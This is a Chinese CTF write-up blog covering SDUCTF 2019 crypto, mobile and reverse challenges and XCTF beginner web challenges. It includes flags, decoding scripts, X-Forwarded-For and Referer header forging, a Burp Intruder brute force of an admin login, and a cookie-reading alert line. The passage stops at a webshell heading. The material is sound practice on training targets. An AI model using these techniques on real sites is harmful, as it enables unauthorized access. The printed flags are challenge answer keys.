Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook.</p></blockquote><p>既然是密码题，那就百度呗</p><p>搜索的是ok密码，文章和转换的github地址如下</p><blockquote><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a> </p><p><a href="https://github.com/splitbrain/ook" target="_blank" rel="noopener">https://github.com/splitbrain/ook</a> </p></blockquote><p>不过有点不对，观察样例密码，把#换成?，解得flag</p><h3 id="0x08-什么密码？"><a href="#0x08-什么密码？" class="headerlink" title="0x08 什么密码？"></a>0x08 什么密码？</h3><blockquote><p>题目描述：</p><p>EVA给Tom发了一封邮件，但是Tom却看不懂EVA想表达什么，请你向Tom解释一下这封邮件</p><p>发件人：EVA<br>收件人：Tom<br>Pxevhfxmhietrpbmamablztfx</p><p>flag格式：sductf{+.}</p><p>The answer is related to my favorite movie.</p></blockquote><p>密码可能做着做着心态崩了，不小心把Crypto当misc做了</p><p>把图片下下来，没注意到图片上到Cesar，binwalk跑一波图片，发下里面还有一个zlib，百度解zlib，然后疯狂报错，贼难受，然后看了hint，得知凯撒密码</p><p>难受 -600point</p><p>位移几位忘了。</p><p>And 十分真实，都把顺序放我TODO List下了，妈耶</p><p>什么密码？<a href="https://blog.csdn.net/qq_40574571/article/details/80164981" target="_blank" rel="noopener">https://blog.csdn.net/qq_40574571/article/details/80164981</a></p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\crypto8.jpg" alt></p><h3 id="0x09-Mix"><a href="#0x09-Mix" class="headerlink" title="0x09 Mix"></a>0x09 Mix</h3><blockquote><p>题目描述：解开她，flag就是你的了</p><p> JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzM7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzE7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzY7JiN4MzI7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzg7JiN4MjU7JiN4MzM7JiN4MzU7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzg7JiN4MjU7JiN4MzM7JiN4MzU7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzM7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzI7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzA7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzY7JiN4MzQ7 </p></blockquote><p>一看这种就是混合密码，靠直觉先解一波base64，然后发下可以解下去，发一波解密顺序，忘记录flag了。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（<span class="function"><span class="title">base64</span>-&gt;</span><span class="function"><span class="title">unicode</span>-&gt;</span>转中文（<span class="function"><span class="title">utf</span>-8)-&gt;</span><span class="function"><span class="title">urldecode</span>-&gt;</span>hex decode）</span><br></pre></td></tr></table></figure><h2 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a><center>Mobile</center></h2><h3 id="0x01-apk1"><a href="#0x01-apk1" class="headerlink" title="0x01 apk1"></a>0x01 apk1</h3><blockquote><p> 题目描述：用着安卓手机，你懂apk吗？ </p></blockquote><p>通过工具<code>d2j-dex2jar</code>和<code>jd-gui</code>两者逆向apk得到flag</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\mobile-apk1.jpg" alt></p><h3 id="0x02-apk2"><a href="#0x02-apk2" class="headerlink" title="0x02 apk2"></a>0x02 apk2</h3><blockquote><p>题目描述： 你真的懂apk吗？ </p></blockquote><p>通过工具<code>d2j-dex2jar</code>和<code>jd-gui</code>两者逆向apk得到flag</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\mobile-apk2.jpg" alt></p><p>然后看代码可知是对字符串进行一个排序，将字符串里的第i位放到s2[i]位，得到结果</p><p>直接写一个python脚本得到flag</p><h3 id="0x03-apk3"><a href="#0x03-apk3" class="headerlink" title="0x03 apk3"></a>0x03 apk3</h3><blockquote><p> 题目描述：再来一发，听说过Kotlin吗？ </p></blockquote><p>下下来解压按套路拖给<code>d2j-dex2jar</code>然后发现有两个<code>.dex</code>后缀的文件，逆向报错</p><p>于是现去网上下了一个jeb逆向，然后找一个样例现学jeb</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\mobile-apk3-2.jpg" alt></p><p>直觉看这个字符串有用，然后在下面果然发现</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\mobile-apk3-1.jpg" alt></p><p>play函数就是对这个字符串进行比对，就是将字符串的偶数位的ascii值减2，得到新串与该字符串进行比较</p><p>写个python脚本逆着加回去可得flag</p><p>apk3：sductf{Easy_Apk_1s_n0t_hard_4_U!}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;f</span><br><span class="line"><span class="string">'a2P1W3Pmc0Tha3jfOX@rVzDzV22wbF7oWXHkVzPfTSD9'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> cnt%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line"><span class="meta">... </span>            s += chr(ord(i)+<span class="number">2</span>)</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">else</span>:</span><br><span class="line"><span class="meta">... </span>            s+=i</span><br><span class="line"><span class="meta">... </span>    cnt += <span class="number">1</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line"><span class="string">'c2R1Y3Rme0Vhc3lfQXBrXzFzX24wdF9oYXJkXzRfVSF9'</span></span><br></pre></td></tr></table></figure><h3 id="0x04-FuckAPP"><a href="#0x04-FuckAPP" class="headerlink" title="0x04 FuckAPP"></a>0x04 FuckAPP</h3><blockquote><p>题目描述：  你真的懂apk吗？ </p></blockquote><p>常规，拖进jeb看main函数，发现只有一些setViewID之类的函数并没有主要的逻辑，于是回去将apk解压缩</p><p>发现包里和以前的apk解压不同，apk3是多了一个Kotlin文件夹，而这个fuck app 是多了一个lib文件夹，猜主要的函数在里面，打开<code>lib/arm64-v8a</code>得到一个<code>libnative-lib.so</code>，拖进IDA里进行逆向</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\mobile-apk4-fuck.jpg" alt></p><p>暴力搜一波果然看到了flag，直接得到flag，还以为要看函数逻辑。</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a><center>Reverse</center></h2><h3 id="0x01-Java-jar"><a href="#0x01-Java-jar" class="headerlink" title="0x01 Java jar"></a>0x01 Java jar</h3><blockquote><p>题目描述： 都是java程序员，互相偷个代码谁不会呀！ </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\re1-java.jpg" alt></p><p>下载附件得到jar包，直接解压得到文件，打开<code>main.class</code>，看到flag明文就在main.class里</p><h3 id="0x02-C"><a href="#0x02-C" class="headerlink" title="0x02 C"></a>0x02 C</h3><blockquote><p>题目描述： C#简直跟java一样，会java就自然上手c#了。 </p></blockquote><p>下载附件得到sductf.exe，拖入辣个女人ida进行逆向，直接得到flag</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\re2-sductf.jpg" alt></p><h3 id="0x03-Rust"><a href="#0x03-Rust" class="headerlink" title="0x03 Rust"></a>0x03 Rust</h3><blockquote><p>题目描述： 你听说过Rust语言吗？<br>                    据说它非常安全。 </p></blockquote><p>没接触过rust语言，不过据说逆向不知道程序逆向结构时，最好自己写个程序HelloWorld进行逆向一波看结构，但是我偷懒了。</p><p>直接百度搜索：rust逆向</p><p> <a href="https://www.anquanke.com/post/id/169970" target="_blank" rel="noopener">https://www.anquanke.com/post/id/169970</a> </p><p> <a href="https://blog.csdn.net/qq_33438733/article/details/81138573" target="_blank" rel="noopener">https://blog.csdn.net/qq_33438733/article/details/81138573</a> </p><p>看完链接之后打开ida，还需要64bit的辣个女人。</p><p>乱逛发现有一个字符串，但是解码出来是一个奇怪的东西，继续找主函数main</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\re3-rust-2.jpg" alt></p><p>主函数入口</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\re3-rust-3.jpg" alt></p><p>点进第一个函数查看流程</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\re3-rust-4.jpg" alt></p><p>既然是逆向，那就从尾部往后面看，果然看到一个判断和一个类似flag的字符串<code>c2R1Y3Rme0lfbDB2ZV9ydXN0X2hoaGh9</code>，base64解码得到flag：<code>sductf{I_l0ve_rust_hhhh}</code></p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\re3-rust-5.jpg" alt></p><h3 id="0x04-EasyCrackMe"><a href="#0x04-EasyCrackMe" class="headerlink" title="0x04 EasyCrackMe"></a>0x04 EasyCrackMe</h3><blockquote><p>题目描述：无</p></blockquote><p>下下来是一个exe文件，用010editor打开，发现说是PE文件，而且也发现是PE文件头，于是拖进去IDA逆向。</p><p>逆向main函数无思路，便开TextView查看，看到如下图黄色字符串感觉很奇怪，而且下面有一个Congratulations！，猜测这段字符串是flag</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\re4-1.jpg" alt></p><p>F5进入查看具体函数，大概是对输入字符串的每一位与0x16进行异或得到v5字符串</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\re4-2.jpg" alt></p><p>于是用python逆函数一波，果然得到flag</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\re4-3.jpg" alt></p><p>在后面写wp时，完善了思路。</p><p>因为进去运行提示输入一个key，然后就在IDA的TextView搜索key，得到第一张图的函数入口，接下来看逻辑即可。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-adworld-web-wp</title>
      <link href="/2019/11/11/XCTF-adworld-web-wp/"/>
      <url>/2019/11/11/XCTF-adworld-web-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="Web-amp-WriteUp"><a href="#Web-amp-WriteUp" class="headerlink" title="Web&amp;WriteUp"></a><center>Web&amp;WriteUp</center></h1><p>Web如同一座正三角冰山，等着去探索。。。</p><h1 id="攻防世界-amp-Web新手练习区"><a href="#攻防世界-amp-Web新手练习区" class="headerlink" title="攻防世界&amp;Web新手练习区"></a><center>攻防世界&amp;Web新手练习区</center></h1><h2 id="0x01-view-source"><a href="#0x01-view-source" class="headerlink" title="0x01  view_source"></a>0x01  view_source</h2><blockquote><p> 题目描述：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。 </p></blockquote><p>利用view-source://url或者f12或者右键查看源码，flag就在源码里</p><h2 id="0x02-get-post"><a href="#0x02-get-post" class="headerlink" title="0x02  get_post"></a>0x02  get_post</h2><blockquote><p> 题目描述：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？ </p></blockquote><p>利用burp suite 发包得到flag</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-web-wp\2.jpg" alt></p><p>另一种思路是利用python的requests库发送请求。</p><h2 id="0x03-robots"><a href="#0x03-robots" class="headerlink" title="0x03  robots"></a>0x03  robots</h2><blockquote><p>题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。 </p></blockquote><p>查看源码肯定是没有flag的，根据题目robots可联想到web的robots.txt协议</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-web-wp\3.jpg" alt></p><blockquote><p>robots.txt协议是在Web站点的根目录下设置一个robots.txt文件，规定站点上的哪些区域或者哪些页面是限制搜索的。搜索程序将参考该文件，决定站点中的哪些区域是不允许搜索的，并在接下来的搜索过程中跳过这些区域。</p><p>下面是一个例子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="comment">#robots.txt for http://somehost.com</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">User-agent: *</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Disallow: /cgi-bin</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Disallow: /registration</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure></blockquote><blockquote><p>示例中第一行是一行注释，注释以一个#开头。</p><ul><li>User-agent：指访问站点的程序，每个浏览器都有一个唯一的User-agent值，浏览器在向Web服务器发送请求时会在每个请求中都附加这个值。Web站点通过在robots.txt中使用User-agent就可以针对不同的User-agent设置不同的规则。</li><li>Disallow是拒绝语句，定义了搜索程序不允许访问的Web站点路径。拒绝语句只针对路径进行设置，不针对具体的文件。</li></ul></blockquote><p>直接访问<a href="http://xxx.xxx.xxx.xxx/robots.txt" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx/robots.txt</a></p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-web-wp\3_2.jpg" alt></p><p>得到一个php路径，直接访问得到flag</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-web-wp\3_3.jpg" alt></p><h2 id="0x04-backup"><a href="#0x04-backup" class="headerlink" title="0x04 backup"></a>0x04 backup</h2><blockquote><p> 题目描述：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！ </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-web-wp\4.jpg" style="zoom:50%;"></p><p> php的备份有两种：<em>.php~和</em>.php.bak </p><p> 如果网站存在备份文件，在地址栏最末加上/index.php~或/index.php.bak，即可得到备份文件 <code>index.php.bak</code></p><p>访问 <a href="http://url/index.php.bak" target="_blank" rel="noopener">http://url/index.php.bak</a> 即自动下载了index.php.bak，打开查看flag就在里面</p><h2 id="0x05-cookie"><a href="#0x05-cookie" class="headerlink" title="0x05  cookie"></a>0x05  cookie</h2><blockquote><p>题目描述：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’ </p></blockquote><p>chrome在console中输入命令<code>javascript:alert(document.cookie)</code></p><p>其实在地址栏输入也可以实现</p><p>弹出 <code>look-here=cookie.php</code></p><p>访问<code>url/cookie.php</code>看到<code>See the http response</code></p><p>打开F12开发者模式的Network，查看<code>cookie.php</code>的回应，Response里没找到flag，最后在Response Headers里找到flag</p><h2 id="0x06-disabled-button"><a href="#0x06-disabled-button" class="headerlink" title="0x06 disabled button"></a>0x06 disabled button</h2><blockquote><p> 题目描述：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？ </p></blockquote><p>明显是一个灰色的按钮，查看源码有<code>&lt;button disabled&gt;</code>跟hackergame2019的签到题一样，把disabled删掉点击按钮即可。</p><h2 id="0x07-simple-js"><a href="#0x07-simple-js" class="headerlink" title="0x07  simple_js"></a>0x07  simple_js</h2><blockquote><p> 题目描述：小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} ) </p></blockquote><p>先输入任意字符进入页面查看源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dechiffre</span>(<span class="params">pass_enc</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> pass = <span class="string">"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65"</span>;</span><br><span class="line">        <span class="keyword">var</span> tab  = pass_enc.split(<span class="string">','</span>);</span><br><span class="line">                <span class="keyword">var</span> tab2 = pass.split(<span class="string">','</span>);<span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">""</span>;i = <span class="number">0</span>;j = tab.length;</span><br><span class="line">                        k = j + (l) + (n=<span class="number">0</span>);</span><br><span class="line">                        n = tab2.length;</span><br><span class="line">                        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;o = tab[i-l];p += <span class="built_in">String</span>.fromCharCode((o = tab2[i]));</span><br><span class="line">                                <span class="keyword">if</span>(i == <span class="number">5</span>)<span class="keyword">break</span>;&#125;</span><br><span class="line">                        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;</span><br><span class="line">                        o = tab[i-l];</span><br><span class="line">                                <span class="keyword">if</span>(i &gt; <span class="number">5</span> &amp;&amp; i &lt; k<span class="number">-1</span>)</span><br><span class="line">                                        p += <span class="built_in">String</span>.fromCharCode((o = tab2[i]));</span><br><span class="line">                        &#125;</span><br><span class="line">        p += <span class="built_in">String</span>.fromCharCode(tab2[<span class="number">17</span>]);</span><br><span class="line">        pass = p;<span class="keyword">return</span> pass;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">String</span>[<span class="string">"fromCharCode"</span>](dechiffre(<span class="string">"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</span>));</span><br><span class="line"></span><br><span class="line">    h = <span class="built_in">window</span>.prompt(<span class="string">'Enter password'</span>);</span><br><span class="line">    alert( dechiffre(h) );</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>看源码得知不论输入什么都会跳转至假密码然后失败，于是直接处理<code>fromCharCode</code>，得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(s)</span><br><span class="line"><span class="string">"55,56,54,79,115,69,114,116,107,49,50"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">""</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line"><span class="meta">... </span>   b =chr(i)</span><br><span class="line"><span class="meta">... </span>    s += b</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(s)</span><br><span class="line"><span class="number">786</span>OsErtk12</span><br></pre></td></tr></table></figure><h2 id="0x08-xff-referer"><a href="#0x08-xff-referer" class="headerlink" title="0x08 xff referer"></a>0x08 xff referer</h2><blockquote><p>题目描述：X老师告诉小宁其实xff和referer是可以伪造的 </p></blockquote><p>直接访问网站，提示需要特定ip访问</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-web-wp\8.jpg" style="zoom: 80%;"></p><p>由题目描述猜想是改http请求，进行下一步.</p><p>百度xff可知</p><blockquote><p>X-Forwarded-For位于HTTP协议的请求头， 是一个 HTTP 扩展头部。HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP。如今它已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入RFC 7239（Forwarded HTTP Extension）标准之中。</p></blockquote><p>利用burpsuite直接伪造http header 的 <code>X-Forwarded-For</code>， X-Forwarded-For 请求头格式如下</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-<span class="keyword">For</span>: client, proxy1, proxy2</span><br></pre></td></tr></table></figure><p> 可以看到，XFF 的内容由「英文逗号 + 空格」隔开的多个部分组成，最开始的是离服务端最远的设备 IP，然后是每一级代理设备的 IP </p><p>如果一个 HTTP 请求到达服务器之前，经过了三个代理 Proxy1、Proxy2、Proxy3，IP 分别为 IP1、IP2、IP3，用户真实 IP 为 IP0，那么按照 XFF 标准，服务端最终会收到以下信息<code>X-Forwarded-For: IP0, IP1, IP2</code></p><blockquote><p>PS： Remote Address 无法伪造，因为建立 TCP 连接需要三次握手，如果伪造了源 IP，无法建立 TCP 连接，更不会有后面的 HTTP 请求 </p></blockquote><p>然后得到如下页面</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-web-wp\8_1.jpg"></p><p>百度Refer可知</p><blockquote><p>HTTP_REFERER提供了引导用户代理到当前页的前一页的地址信息，常见的一些应用场景有防盗链，统计文章有多少次是来自谷歌搜索结果，多少次来自百度搜索结果等。 </p></blockquote><blockquote><ul><li>什么时候获取不到HTTP_REFERER值</li></ul><p>综上所述，HTTP_REFERER存在需要两个条件：</p><p>浏览器（客户端）请求（服务器端请求的情况下，是不存在HTTP_REFERER的，但是可以伪造header，这在下一节中将提及）；<br>存在前导页；</p><p>​    以下是一些获取不到HTTP_REFERER值的情况：</p><ul><li><p>在浏览器内直接敲URL</p></li><li><p>windows桌面上的超链接图标</p></li><li><p>浏览器内书签</p></li><li><p>第三方软件（如Word，Excel等）内容中的链接</p></li><li><p>SSL认证网站跳入</p></li><li><p>&lt; <a href="http://example.com/“&gt;" target="_blank" rel="noopener">http://example.com/“&gt;</a> meta页面设置自动跳转时，在example.com将取不到REFERER URL</p></li><li><p>使用JavaScript的Location.href或者是Location.replace()</p></li></ul><p>  在以下情况下可以获取HTTP_REFERER值：</p><ul><li><p>直接用form提交的表单(POST或GET)</p></li><li><p>src请求（如js的script标签及html中img标签的src属性）</p></li></ul></blockquote><p>直接伪造header的<code>Referer</code>属性</p><p>但是没有得到结果</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-web-wp\8_2.jpg" alt></p><p>后面百度发现，<code>url/xxx</code>和<code>url/xxx/</code>是不一样的，<code>url/xxx</code>是直接访问xxx的文件，而<code>url/xxx/</code>是访问xxx目录，因此我们刚才得不到flag，将Referer的后面的斜杠去掉，再次请求，得到flag</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-web-wp\8_3.jpg" alt></p><h2 id="0x09-weak-auth"><a href="#0x09-weak-auth" class="headerlink" title="0x09  weak_auth"></a>0x09  weak_auth</h2><blockquote><p> 题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。 </p></blockquote><p>直接点login跳转到了check.php，提示：please login as admin</p><p>用admin空密码去登陆，显示：password error</p><p>点确认，F12查看源码<code>&lt;script&gt;alert(&#39;password error&#39;);&lt;/script&gt;&lt;!--maybe you need a dictionary--&gt;</code>提示可能需要一个字典，肯定是<strong>爆破</strong>了</p><p>因此，我去学习了BurpSuite的Intruder功能——用于爆破的一个工具。</p><p>关于Burp Suite 的Intruder模块的四种选项的解释 <a href="https://howiezhao.github.io/2018/05/01/burpsuite-intruder-attack-type/" target="_blank" rel="noopener">https://howiezhao.github.io/2018/05/01/burpsuite-intruder-attack-type/</a> </p><p>关于BurpSuite的Intruder模块的解释： <a href="https://www.cnblogs.com/yufusec/p/9179625.html" target="_blank" rel="noopener">https://www.cnblogs.com/yufusec/p/9179625.html</a> </p><p>然后爆破得到密码123456，进入系统得到flag</p><h2 id="0x0a-webshell"><a href="#0x0a-webshell" class="headerlink" title="0x0a webshell"></a>0x0a webshell</h2><blockquote><p> 